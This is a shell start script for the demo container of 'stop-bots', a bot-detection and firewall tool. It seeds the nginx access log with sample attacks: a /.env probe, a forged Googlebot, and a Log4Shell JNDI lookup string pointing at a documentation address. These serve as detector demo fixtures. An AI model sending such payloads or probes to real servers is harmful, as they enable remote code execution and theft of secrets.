#!/bin/sh
#
#  This file is part of the stop-bots project.
#
#  Copyright (C) 2026 Marko Ivankovic
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU Affero General Public License as published
#  by the Free Software Foundation, version 3 of the License.
#
#  The start script of the `make demo` container (see docs/demo/Containerfile).
#  It runs inside the container only: everything it writes is gone when the
#  container exits.

set -eu

nginx

# An SSH log for the anti-lockout check to read. A container has no sshd and
# no journal, and without a log `batch --apply` refuses, as it should on a
# real server.
touch /var/log/auth.log
stop-bots set-log-paths --ssh-log /var/log/auth.log > /dev/null

# Three requests a detector catches, from documentation addresses, stamped
# now so they fall inside every detector's window.
now=$(LC_ALL=C date '+%d/%b/%Y:%H:%M:%S %z')
{
    printf '203.0.113.7 - - [%s] "GET /.env HTTP/1.1" 404 162 "-" "Mozilla/5.0"\n' "$now"
    printf '203.0.113.8 - - [%s] "GET / HTTP/1.1" 200 612 "-" "${jndi:ldap://198.51.100.1/a}"\n' "$now"
    printf '198.51.100.23 - - [%s] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"\n' "$now"
} >> /var/log/nginx/access.log

cat <<'EOF'

stop-bots demo
==============

A throwaway Ubuntu 24.04 container with NGINX serving one site on port 8080
(/etc/nginx/sites-enabled/test-site.conf). Firewall rules land in this
container's own network namespace, never on your machine. `exit` deletes it.

The access log already holds a probe for /.env, a Log4Shell attempt and a
forged Googlebot. Things to try:

  stop-bots                          the TUI; `?` lists the keys, `q` quits
  stop-bots batch --dry-run --diff   what an apply would change, changing nothing
  stop-bots batch --apply            download the lists, run the detectors, apply
  stop-bots list-firewall-rules      every block, and the log line behind it
  curl -s -o /dev/null -w '%{http_code}\n' -A GPTBot localhost:8080/
                                     403 once applied, 200 before
  stop-bots status                   whether the host is actually protected
  stop-bots uninstall all --dry-run  how it would put everything back

`batch --apply` downloads the bot lists; add --no-fetch to stay offline (the
list built into the binary is used then, and GPTBot is not in it).

EOF

exec bash
